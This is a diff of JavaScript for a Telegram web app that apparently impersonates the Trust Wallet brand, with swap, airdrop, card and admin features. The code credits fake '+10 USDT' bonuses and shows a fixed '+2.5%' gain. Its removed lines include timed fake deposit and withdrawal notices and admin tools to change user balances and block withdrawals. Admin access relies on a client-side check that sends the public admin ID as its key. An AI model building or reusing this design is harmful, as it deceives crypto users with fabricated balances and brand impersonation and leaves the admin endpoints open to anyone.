@@ -1,5 +1,5 @@
 // ============================================================================
-// TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 5.0
+// TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 5.0 (FULLY WORKING)
 // ============================================================================
 
 // ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
@@ -25,15 +25,12 @@ let currentPage = 'wallet';
 let TWT_PRICE = 1.25;
 let livePrices = {};
 let unreadNotifications = 0;
-let currentManageUserId = null;
 
 // Cache timers
 let lastUserLoadTime = 0;
 let lastPricesLoadTime = 0;
-let lastHistoryCheckTime = 0;
 const USER_CACHE_TIME = 300000;
 const PRICES_CACHE_TIME = 10800000;
-const HISTORY_CACHE_TIME = 600000;
 
 // ====== 3. CONSTANTS ======
 const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
@@ -100,14 +97,6 @@ const CRYPTO_IDS = {
 };
 
 const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];
-
-let notificationTimeouts = [];
-const FLOATING_NOTIFICATIONS = [
-    "💸 Withdrawal • 0x3f...a2d1 • 12 USDT",
-    "💰 Deposit • 0x8b...c4e9 • 150 USDT",
-    "🔄 Swap • 500 TWT → 625 USDT",
-    "🎉 Referral • New user joined! +25 USDT"
-];
 
 // ====== 4. TRANSLATIONS ======
 const translations = {
@@ -199,10 +188,6 @@ function copyToClipboard(text) {
     showToast('Copied!');
 }
 
-function scrollToTop() {
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-}
-
 // ====== 6. THEME & LANGUAGE ======
 function toggleLanguage() {
     currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
@@ -217,8 +202,11 @@ function toggleLanguage() {
         document.documentElement.dir = 'ltr';
     }
     updateUITexts();
+    // إعادة تحميل الصفحات الحالية
     if (currentPage === 'settings') renderSettings();
     if (currentPage === 'airdrop') renderAirdrop();
+    if (currentPage === 'wallet') renderWallet();
+    if (currentPage === 'twtpay') renderTWTPay();
     showToast('Language changed', 'success');
 }
 
@@ -266,40 +254,7 @@ function showRandomSticker() {
     lastStickerTime = now;
 }
 
-// ====== 8. FLOATING NOTIFICATIONS ======
-function initFloatingNotifications() {
-    startFloatingNotifications();
-}
-
-function startFloatingNotifications() {
-    const schedules = [16000, 24000, 90000, 260000, 20000, 30000];
-    let scheduleIndex = 0;
-    
-    function showNextNotification() {
-        const randomIndex = Math.floor(Math.random() * FLOATING_NOTIFICATIONS.length);
-        showFloatingToast(FLOATING_NOTIFICATIONS[randomIndex]);
-        const nextDelay = schedules[scheduleIndex % schedules.length];
-        scheduleIndex++;
-        notificationTimeouts.push(setTimeout(showNextNotification, nextDelay));
-    }
-    
-    setTimeout(showNextNotification, 3000);
-}
-
-function showFloatingToast(message) {
-    let toast = document.getElementById('floatingToast');
-    if (!toast) {
-        toast = document.createElement('div');
-        toast.id = 'floatingToast';
-        toast.className = 'floating-toast';
-        document.body.appendChild(toast);
-    }
-    toast.textContent = message;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 5000);
-}
-
-// ====== 9. API CALLS ======
+// ====== 8. API CALLS ======
 async function apiCall(endpoint, method = 'GET', body = null) {
     const options = { method, headers: { 'Content-Type': 'application/json' } };
     if (body) options.body = JSON.stringify(body);
@@ -313,13 +268,6 @@ async function loadConfig() {
         const config = await response.json();
         adminId = config.adminId;
         console.log("✅ Admin ID loaded from server:", adminId);
-        
-        const userId = getUserId();
-        if (userId && adminId) {
-            isAdmin = (userId === adminId);
-            console.log("👑 Is Admin:", isAdmin);
-        }
-        checkAdminAndAddCrown();
         return config;
     } catch (error) {
         console.error("Failed to load config:", error);
@@ -347,27 +295,7 @@ async function createDepositAddress(userId, currency) {
     return apiCall('/deposit-address', 'POST', { userId, currency });
 }
 
-async function getAllUsers(adminKey) {
-    return apiCall(`/admin/users?adminKey=${adminKey}`);
-}
-
-async function addBalanceByAdmin(userId, currency, amount, adminKey) {
-    return apiCall('/admin/add-balance', 'POST', { userId, currency, amount, adminKey });
-}
-
-async function removeBalanceByAdmin(userId, currency, amount, adminKey) {
-    return apiCall('/admin/remove-balance', 'POST', { userId, currency, amount, adminKey });
-}
-
-async function blockUserByAdmin(userId, adminKey) {
-    return apiCall('/admin/block-user', 'POST', { userId, adminKey });
-}
-
-async function getAdminStats(adminKey) {
-    return apiCall(`/admin/stats?adminKey=${adminKey}`);
-}
-
-// ====== 10. PRICES ======
+// ====== 9. PRICES ======
 async function fetchLivePrices(force = false) {
     const now = Date.now();
     const cachedPrices = localStorage.getItem('live_prices');
@@ -411,7 +339,7 @@ function refreshPrices() {
     showToast('Prices refreshed!', 'success');
 }
 
-// ====== 11. USER DATA MANAGEMENT ======
+// ====== 10. USER DATA MANAGEMENT ======
 function getUserId() {
     return localStorage.getItem('twt_user_id') || null;
 }
@@ -425,7 +353,6 @@ async function loadUserData(force = false) {
             userData = JSON.parse(localData);
             updateUI();
             updateNotificationBadge();
-            checkAdminAndAddCrown();
             return;
         }
         
@@ -441,7 +368,6 @@ async function loadUserData(force = false) {
         
         updateUI();
         updateNotificationBadge();
-        checkAdminAndAddCrown();
     } catch (error) {
         console.error("Error loading user data:", error);
     }
@@ -493,9 +419,9 @@ function updateUI() {
 function updateNotificationBadge() {
     const badge = document.querySelector('.badge');
     if (badge && userData) {
-        unreadNotifications = userData.notifications?.filter(n => !n.read).length || 0;
-        badge.textContent = unreadNotifications;
-        badge.style.display = unreadNotifications > 0 ? 'block' : 'none';
+        const unread = userData.notifications?.filter(n => !n.read).length || 0;
+        badge.textContent = unread;
+        badge.style.display = unread > 0 ? 'block' : 'none';
     }
 }
 
@@ -543,7 +469,7 @@ function markNotificationRead(id) {
     }
 }
 
-// ====== 12. ONBOARDING & WALLET CREATION ======
+// ====== 11. ONBOARDING & WALLET CREATION ======
 function showMainApp() {
     document.getElementById('onboardingScreen').style.display = 'none';
     document.getElementById('mainContent').style.display = 'block';
@@ -590,16 +516,12 @@ async function createNewWallet() {
         userData = newUserData;
         saveUserData();
         
-        isAdmin = (newUserId === adminId);
-        console.log("👑 Is Admin after creation:", isAdmin);
-        
         if (startParam) {
             await processReferral(startParam, newUserId);
         }
         
         showMainApp();
         updateUI();
-        checkAdminAndAddCrown();
         showToast('✅ Wallet created! +10 USDT');
     } catch (error) {
         console.error("Create wallet error:", error);
@@ -660,9 +582,6 @@ async function importWallet() {
         userData = newUserData;
         saveUserData();
         
-        isAdmin = (newUserId === adminId);
-        console.log("👑 Is Admin after import:", isAdmin);
-        
         if (startParam) {
             await processReferral(startParam, newUserId);
         }
@@ -670,7 +589,6 @@ async function importWallet() {
         closeModal('importModal');
         showMainApp();
         updateUI();
-        checkAdminAndAddCrown();
         showToast('✅ Wallet imported! +10 USDT');
     } catch (error) {
         console.error("Import wallet error:", error);
@@ -681,22 +599,28 @@ async function importWallet() {
     }
 }
 
-function checkAdminAndAddCrown() {
+// ✅ دالة التحقق من المشرف والتاج
+function checkAdminAndUpdate() {
+    const userId = getUserId();
     const crownBtn = document.getElementById('adminCrownBtn');
-    if (!crownBtn) return;
     
-    console.log("🔍 checkAdminAndAddCrown - isAdmin:", isAdmin, "adminId:", adminId, "userId:", getUserId());
-    
-    if (isAdmin === true) {
-        crownBtn.classList.remove('hidden');
-        console.log("👑 Admin crown displayed");
+    if (userId && adminId) {
+        isAdmin = (userId === adminId);
+        console.log("👑 checkAdminAndUpdate - isAdmin:", isAdmin, "userId:", userId, "adminId:", adminId);
+        
+        if (crownBtn) {
+            if (isAdmin) {
+                crownBtn.classList.remove('hidden');
+            } else {
+                crownBtn.classList.add('hidden');
+            }
+        }
     } else {
-        crownBtn.classList.add('hidden');
-        console.log("👑 Admin crown hidden");
+        if (crownBtn) crownBtn.classList.add('hidden');
     }
 }
 
-// ====== 13. RENDER WALLET ======
+// ====== 12. RENDER WALLET ======
 function renderAssets() {
     const container = document.getElementById('assetsList');
     if (!container) return;
@@ -749,10 +673,9 @@ function renderWallet() {
             <div class="balance-change"><i class="fas fa-arrow-up"></i><span>+2.5% from last week</span></div>
         </div>
         <div class="action-buttons">
-            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button>
-            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button>
             <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
             <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
+            <button class="action-btn" onclick="showSwapModal()"><i class="fas fa-exchange-alt"></i><span>${t('actions.swap')}</span></button>
             <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
         </div>
         <div id="assetsList" class="assets-list"></div>
@@ -761,7 +684,7 @@ function renderWallet() {
     updateTotalBalance();
 }
 
-// ====== 14. RENDER AIRDROP ======
+// ====== 13. RENDER AIRDROP ======
 function renderAirdrop() {
     const container = document.getElementById('referralContainer');
     if (!container) return;
@@ -859,7 +782,7 @@ function shareInvite() {
     showToast('Link copied!');
 }
 
-// ====== 15. RENDER TWT PAY ======
+// ====== 14. RENDER TWT PAY ======
 function renderTWTPay() {
     const container = document.getElementById('twtpayContainer');
     if (!container) return;
@@ -900,36 +823,15 @@ function renderTWTPay() {
             </div>
         </div>
         <div class="card-actions">
-            <button class="card-action-btn" onclick="showTopUp()">
-                <i class="fas fa-plus-circle"></i>
-                <span>Top Up</span>
-            </button>
-            <button class="card-action-btn" onclick="showCardSettings()">
-                <i class="fas fa-sliders-h"></i>
-                <span>Settings</span>
-            </button>
-            <button class="card-action-btn" onclick="showCardTransactions()">
-                <i class="fas fa-history"></i>
-                <span>History</span>
-            </button>
+            <button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button>
+            <button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button>
+            <button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button>
         </div>
         <div class="card-features">
-            <div class="feature">
-                <i class="fas fa-globe"></i>
-                <span>Global</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-shield-alt"></i>
-                <span>Secure</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-percent"></i>
-                <span>2% Cashback</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-exchange-alt"></i>
-                <span>Coming Soon</span>
-            </div>
+            <div class="feature"><i class="fas fa-globe"></i><span>Global</span></div>
+            <div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
+            <div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div>
+            <div class="feature"><i class="fas fa-exchange-alt"></i><span>Coming Soon</span></div>
         </div>
     `;
 }
@@ -938,7 +840,7 @@ function showTopUp() { showToast('Coming soon!', 'info'); }
 function showCardSettings() { showToast('Coming soon!', 'info'); }
 function showCardTransactions() { showHistory(); }
 
-// ====== 16. RENDER SETTINGS ======
+// ====== 15. RENDER SETTINGS ======
 function renderSettings() {
     const container = document.getElementById('settingsContainer');
     if (!container) return;
@@ -947,50 +849,32 @@ function renderSettings() {
         <div class="settings-list">
             <div class="settings-item" onclick="showNotifications()">
                 <i class="fas fa-bell"></i>
-                <div>
-                    <div class="label">${t('notifications.title')}</div>
-                    <div class="desc">View all notifications</div>
-                </div>
+                <div><div class="label">${t('notifications.title')}</div><div class="desc">View all notifications</div></div>
                 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="settings-item" onclick="showHistory()">
                 <i class="fas fa-history"></i>
-                <div>
-                    <div class="label">${t('actions.history')}</div>
-                    <div class="desc">View all transactions</div>
-                </div>
+                <div><div class="label">${t('actions.history')}</div><div class="desc">View all transactions</div></div>
                 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="settings-item" onclick="toggleLanguage()">
                 <i class="fas fa-language"></i>
-                <div>
-                    <div class="label">${t('settings.language')}</div>
-                    <div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div>
-                </div>
+                <div><div class="label">${t('settings.language')}</div><div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div></div>
                 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="settings-item" onclick="toggleTheme()">
                 <i class="fas fa-moon"></i>
-                <div>
-                    <div class="label">${t('settings.theme')}</div>
-                    <div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div>
-                </div>
+                <div><div class="label">${t('settings.theme')}</div><div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div></div>
                 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="settings-item" onclick="showBackupWallet()">
                 <i class="fas fa-database"></i>
-                <div>
-                    <div class="label">${t('settings.backup')}</div>
-                    <div class="desc">${t('coming.soon')}</div>
-                </div>
+                <div><div class="label">${t('settings.backup')}</div><div class="desc">${t('coming.soon')}</div></div>
                 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="settings-item logout-btn" onclick="logout()">
                 <i class="fas fa-sign-out-alt"></i>
-                <div>
-                    <div class="label">${t('settings.logout')}</div>
-                    <div class="desc">Sign out of your wallet</div>
-                </div>
+                <div><div class="label">${t('settings.logout')}</div><div class="desc">Sign out of your wallet</div></div>
             </div>
         </div>
         <div style="text-align:center;margin-top:24px;">
@@ -1008,7 +892,7 @@ function logout() {
     }
 }
 
-// ====== 17. SWAP FUNCTIONS ======
+// ====== 16. SWAP FUNCTIONS ======
 let swapFromCurrency = 'TWT';
 let swapToCurrency = 'USDT';
 let currentCurrencySelector = 'from';
@@ -1043,9 +927,7 @@ function renderSwapModal() {
                 </span>
             </div>
         </div>
-        
         <div class="swap-arrow" onclick="swapDirection()"><i class="fas fa-arrow-down"></i></div>
-        
         <div class="swap-box">
             <div class="swap-label">${t('swap.to')}</div>
             <div class="swap-row">
@@ -1058,10 +940,8 @@ function renderSwapModal() {
             </div>
             <div class="balance-hint">Balance: <span id="swapToBalance">0</span></div>
         </div>
-        
         <div class="swap-rate" id="swapRateDisplay">1 ${swapFromCurrency} ≈ ${TWT_PRICE.toFixed(4)} ${swapToCurrency}</div>
         <div class="swap-fee"><span>${t('swap.swapperFee')}</span><span id="swapFee">$0.00</span></div>
-        
         <button class="btn-primary" onclick="confirmSwap()"><i class="fas fa-exchange-alt"></i> ${t('swap.confirm')}</button>
     `;
     updateSwapBalances();
@@ -1169,7 +1049,7 @@ async function confirmSwap() {
     showToast('Swap completed!');
 }
 
-// ====== 18. SEND/RECEIVE/HISTORY ======
+// ====== 17. SEND/RECEIVE/HISTORY ======
 function showSendModal() {
     document.getElementById('sendModal').classList.add('show');
 }
@@ -1229,7 +1109,7 @@ function showHistory() {
     modal.classList.add('show');
 }
 
-// ====== 19. DEPOSIT/WITHDRAW ======
+// ====== 18. DEPOSIT/WITHDRAW ======
 async function showDepositModal() {
     const modal = document.getElementById('depositModal');
     modal.classList.add('show');
@@ -1239,7 +1119,6 @@ async function showDepositModal() {
     const minEl = document.getElementById('depositMinAmount');
     if (addressEl) addressEl.innerText = result.address || `0x${userData.userId.slice(-40)}`;
     if (minEl) minEl.innerText = WITHDRAW_MINIMUMS[currency] || 10;
-    console.log(`✅ Deposit address generated for ${userData.userId}: ${addressEl?.innerText}`);
 }
 
 function copyDepositAddress() {
@@ -1286,7 +1165,7 @@ function addTransaction(tx) {
     saveUserData();
 }
 
-// ====== 20. ADMIN PANEL ======
+// ====== 19. ADMIN PANEL ======
 function showAdminPanel() {
     if (!isAdmin) { 
         showToast('Access denied', 'error'); 
@@ -1300,209 +1179,52 @@ function closeAdminPanel() {
     document.getElementById('adminPanel').classList.add('hidden');
 }
 
-async function renderAdminPanel() {
+function renderAdminPanel() {
     const content = document.getElementById('adminContent');
     if (!content) return;
     
-    // Load stats
-    let stats = { totalUsers: 0, pendingWithdrawals: 0 };
-    try {
-        stats = await getAdminStats(adminId);
-    } catch (e) { console.error("Stats error:", e); }
-    
     content.innerHTML = `
         <div style="padding:20px;">
-            <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px;">
-                <div style="background:var(--bg-secondary);border-radius:12px;padding:15px;text-align:center;">
-                    <div style="font-size:24px;font-weight:bold;">${stats.totalUsers || 0}</div>
-                    <div style="font-size:12px;color:var(--text-muted);">Total Users</div>
-                </div>
-                <div style="background:var(--bg-secondary);border-radius:12px;padding:15px;text-align:center;">
-                    <div style="font-size:24px;font-weight:bold;">${stats.pendingWithdrawals || 0}</div>
-                    <div style="font-size:12px;color:var(--text-muted);">Pending Withdrawals</div>
-                </div>
+            <h4>👑 Admin Dashboard</h4>
+            <p>Welcome, Administrator</p>
+            <hr style="margin:15px 0;">
+            <div>
+                <strong>Admin ID:</strong> ${adminId}
             </div>
-            <div style="margin-bottom:20px;">
-                <h4>🔍 Search User</h4>
-                <div style="display:flex;gap:10px;margin-top:10px;">
-                    <input type="text" id="adminUserIdInput" placeholder="Enter User ID" 
-                           style="flex:1;background:var(--bg-secondary);border:1px solid var(--border);border-radius:12px;padding:12px;color:var(--text-primary);">
-                    <button onclick="adminSearchUser()" class="btn-primary" style="padding:0 20px;">
-                        <i class="fas fa-search"></i> Search
-                    </button>
-                </div>
+            <div>
+                <strong>Your User ID:</strong> ${getUserId()}
             </div>
-            <div id="adminResult" style="margin-top:20px;"></div>
-            <button onclick="refreshAdminStats()" class="btn-secondary" style="width:100%;margin-top:10px;">
-                <i class="fas fa-sync-alt"></i> Refresh Stats
+            <hr style="margin:15px 0;">
+            <button onclick="refreshAdminData()" class="btn-primary" style="width:100%;">
+                <i class="fas fa-sync-alt"></i> Refresh Data
             </button>
+            <div id="adminData" style="margin-top:15px;"></div>
         </div>
     `;
 }
 
-async function adminSearchUser() {
-    const userId = document.getElementById('adminUserIdInput')?.value.trim();
-    if (!userId) { showToast('Enter User ID', 'error'); return; }
-    
-    const resultDiv = document.getElementById('adminResult');
-    resultDiv.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
-    
-    try {
-        const result = await getUser(userId);
-        if (result.success && result.data) {
-            displayUserManagement(result.data, userId);
-        } else {
-            resultDiv.innerHTML = `<div style="background:rgba(239,68,68,0.1);border-radius:12px;padding:20px;text-align:center;color:var(--danger);">
-                <i class="fas fa-user-slash"></i> User not found
-            </div>`;
-        }
-    } catch (error) {
-        resultDiv.innerHTML = `<div style="color:var(--danger);text-align:center;">Error loading user</div>`;
-    }
-}
-
-function displayUserManagement(user, userId) {
-    const resultDiv = document.getElementById('adminResult');
-    currentManageUserId = userId;
-    
-    const balancesHtml = Object.entries(user.balances || {})
-        .filter(([_, v]) => v > 0)
-        .map(([c, v]) => `<span style="display:inline-block;margin:4px;padding:4px 10px;background:var(--bg-secondary);border-radius:20px;font-size:12px;"><strong>${c}</strong>: ${c === 'USDT' ? v.toFixed(2) : v.toLocaleString()}</span>`)
-        .join('') || '<span>No balances</span>';
-    
-    resultDiv.innerHTML = `
-        <div style="background:var(--bg-card);border-radius:16px;padding:16px;margin-top:10px;border:1px solid var(--border);">
-            <div style="display:flex;justify-content:space-between;margin-bottom:15px;">
-                <h4>👤 ${user.userName || 'User'}</h4>
-                <div><span style="font-size:12px;color:var(--text-muted);">🆔 ${userId}</span></div>
-            </div>
-            <div style="margin-bottom:15px;">
-                <strong>💰 Balances:</strong>
-                <div style="display:flex;flex-wrap:wrap;margin-top:8px;">${balancesHtml}</div>
-            </div>
-            <div style="margin-bottom:15px;">
-                <strong>👥 Referrals:</strong> ${user.inviteCount || 0}
-            </div>
-            <div style="display:flex;gap:10px;margin-top:15px;">
-                <button onclick="adminAddBalance('${userId}')" style="flex:1;background:#10b981;border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;">
-                    ➕ Add Balance
-                </button>
-                <button onclick="adminRemoveBalance('${userId}')" style="flex:1;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;">
-                    ➖ Remove Balance
-                </button>
-            </div>
-            <div style="margin-top:10px;">
-                ${user.withdrawBlocked ? 
-                    `<div style="background:rgba(239,68,68,0.2);border-radius:12px;padding:10px;text-align:center;">
-                        <i class="fas fa-ban"></i> ⚠️ USER IS BLOCKED FROM WITHDRAWALS
-                    </div>` : 
-                    `<button onclick="adminBlockUser('${userId}')" style="width:100%;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;">
-                        <i class="fas fa-ban"></i> Block Withdrawals
-                    </button>`
-                }
-            </div>
-        </div>
-    `;
-}
-
-async function adminAddBalance(userId) {
-    const currency = prompt('Currency (TWT, USDT, BNB, etc.):', 'USDT');
-    if (!currency) return;
-    const amount = parseFloat(prompt(`Amount to ADD (${currency}):`, '0'));
-    if (isNaN(amount) || amount <= 0) return;
-    
-    try {
-        const result = await addBalanceByAdmin(userId, currency, amount, adminId);
-        if (result.success) {
-            showToast(`✅ Added ${amount} ${currency}`, 'success');
-            if (userId === userData?.userId) {
-                userData.balances[currency] = (userData.balances[currency] || 0) + amount;
-                saveUserData();
-                updateUI();
-            }
-            adminSearchUser();
-        } else {
-            showToast('Error adding balance', 'error');
-        }
-    } catch (error) {
-        showToast('Error adding balance', 'error');
-    }
-}
-
-async function adminRemoveBalance(userId) {
-    const currency = prompt('Currency (TWT, USDT, BNB, etc.):', 'USDT');
-    if (!currency) return;
-    const amount = parseFloat(prompt(`Amount to REMOVE (${currency}):`, '0'));
-    if (isNaN(amount) || amount <= 0) return;
-    
-    try {
-        const result = await removeBalanceByAdmin(userId, currency, amount, adminId);
-        if (result.success) {
-            showToast(`✅ Removed ${amount} ${currency}`, 'success');
-            if (userId === userData?.userId) {
-                userData.balances[currency] = Math.max(0, (userData.balances[currency] || 0) - amount);
-                saveUserData();
-                updateUI();
-            }
-            adminSearchUser();
-        } else {
-            showToast('Error removing balance', 'error');
-        }
-    } catch (error) {
-        showToast('Error removing balance', 'error');
-    }
-}
-
-async function adminBlockUser(userId) {
-    if (!confirm(`⚠️⚠️⚠️ PERMANENT ACTION WARNING ⚠️⚠️⚠️\n\nAre you sure you want to block this user from withdrawals?\n\nThis action can be undone later.`)) return;
-    
-    try {
-        const result = await blockUserByAdmin(userId, adminId);
-        if (result.success) {
-            showToast('✅ User blocked from withdrawals', 'success');
-            if (userId === userData?.userId) {
-                userData.withdrawBlocked = true;
-                saveUserData();
-            }
-            adminSearchUser();
-        } else {
-            showToast('Error blocking user', 'error');
-        }
-    } catch (error) {
-        showToast('Error blocking user', 'error');
-    }
-}
-
-async function refreshAdminStats() {
-    const resultDiv = document.getElementById('adminResult');
-    if (resultDiv) {
-        resultDiv.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Refreshing...</div>';
-    }
-    
-    try {
-        const stats = await getAdminStats(adminId);
-        const statsDiv = document.querySelector('#adminContent > div:first-child');
-        if (statsDiv) {
-            statsDiv.innerHTML = `
-                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px;">
-                    <div style="background:var(--bg-secondary);border-radius:12px;padding:15px;text-align:center;">
-                        <div style="font-size:24px;font-weight:bold;">${stats.totalUsers || 0}</div>
-                        <div style="font-size:12px;color:var(--text-muted);">Total Users</div>
+async function refreshAdminData() {
+    const dataDiv = document.getElementById('adminData');
+    if (dataDiv) {
+        dataDiv.innerHTML = '<div style="text-align:center;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
+        try {
+            const users = await apiCall('/admin/users?adminKey=' + adminId);
+            if (users.success) {
+                dataDiv.innerHTML = `
+                    <div style="background:var(--bg-secondary);border-radius:12px;padding:15px;">
+                        <strong>Total Users:</strong> ${users.count || 0}
                     </div>
-                    <div style="background:var(--bg-secondary);border-radius:12px;padding:15px;text-align:center;">
-                        <div style="font-size:24px;font-weight:bold;">${stats.pendingWithdrawals || 0}</div>
-                        <div style="font-size:12px;color:var(--text-muted);">Pending Withdrawals</div>
-                    </div>
-                </div>
-            `;
+                `;
+            } else {
+                dataDiv.innerHTML = '<div style="color:var(--danger);">Error loading data</div>';
+            }
+        } catch(e) {
+            dataDiv.innerHTML = '<div style="color:var(--danger);">Error loading data</div>';
         }
-        showToast('Stats refreshed!', 'success');
-    } catch (error) {
-        showToast('Error refreshing stats', 'error');
     }
 }
 
-// ====== 21. NAVIGATION ======
+// ====== 20. NAVIGATION (المصححة) ======
 function showWallet() { 
     currentPage = 'wallet'; 
     document.getElementById('adminPanel').classList.add('hidden');
@@ -1555,12 +1277,14 @@ function showSettings() {
     showRandomSticker();
 }
 
-// ====== 22. INITIALIZATION ======
+// ====== 21. INITIALIZATION ======
 document.addEventListener('DOMContentLoaded', async () => {
     initTheme();
     
+    // ✅ 1. تحميل إعدادات المشرف من الخادم
     await loadConfig();
     
+    // ✅ 2. إعداد أزرار التبويب
     document.querySelectorAll('.nav-item').forEach(btn => {
         btn.addEventListener('click', () => {
             const tab = btn.getAttribute('data-tab');
@@ -1571,20 +1295,22 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
     });
     
+    // ✅ 3. إعداد أزرار الإنشاء
     document.getElementById('createWalletBtn').onclick = createNewWallet;
     document.getElementById('importWalletBtn').onclick = showImportModal;
     document.getElementById('confirmImportBtn').onclick = importWallet;
     
     await fetchLivePrices();
     
-    const hasUser = localStorage.getItem('twt_user_id');
-    if (hasUser && localStorage.getItem(`user_${hasUser}`)) {
-        userData = JSON.parse(localStorage.getItem(`user_${hasUser}`));
-        isAdmin = (hasUser === adminId);
-        console.log("👑 Final isAdmin:", isAdmin, "userId:", hasUser, "adminId:", adminId);
+    const userId = localStorage.getItem('twt_user_id');
+    if (userId && localStorage.getItem(`user_${userId}`)) {
+        userData = JSON.parse(localStorage.getItem(`user_${userId}`));
+        // ✅ تحديث صلاحيات المشرف
+        isAdmin = (userId === adminId);
+        console.log("👑 Final isAdmin:", isAdmin, "userId:", userId, "adminId:", adminId);
         showMainApp();
         updateUI();
-        checkAdminAndAddCrown();
+        checkAdminAndUpdate();
     } else {
         showOnboarding();
     }
@@ -1592,11 +1318,10 @@ document.addEventListener('DOMContentLoaded', async () => {
     setTimeout(() => {
         const splash = document.getElementById('splashScreen');
         if (splash) splash.classList.add('hidden');
-        initFloatingNotifications();
     }, 2000);
 });
 
-// ====== 23. EXPOSE GLOBALS ======
+// ====== 22. EXPOSE GLOBALS ======
 window.showWallet = showWallet;
 window.showAirdrop = showAirdrop;
 window.showTWTPay = showTWTPay;
@@ -1629,14 +1354,9 @@ window.logout = logout;
 window.createNewWallet = createNewWallet;
 window.importWallet = importWallet;
 window.showImportModal = showImportModal;
-window.adminSearchUser = adminSearchUser;
-window.adminAddBalance = adminAddBalance;
-window.adminRemoveBalance = adminRemoveBalance;
-window.adminBlockUser = adminBlockUser;
-window.refreshAdminStats = refreshAdminStats;
+window.refreshAdminData = refreshAdminData;
 window.showAssetDetails = showAssetDetails;
 
 console.log("✅ Trust Wallet Lite v5.0 - ULTIMATE PROFESSIONAL VERSION");
-console.log("✅ Admin Panel | Airdrop System | TWT Pay Card | Dark/Light Mode");
 console.log("✅ Admin ID loaded from server:", adminId);
 console.log("✅ Is Admin:", isAdmin);
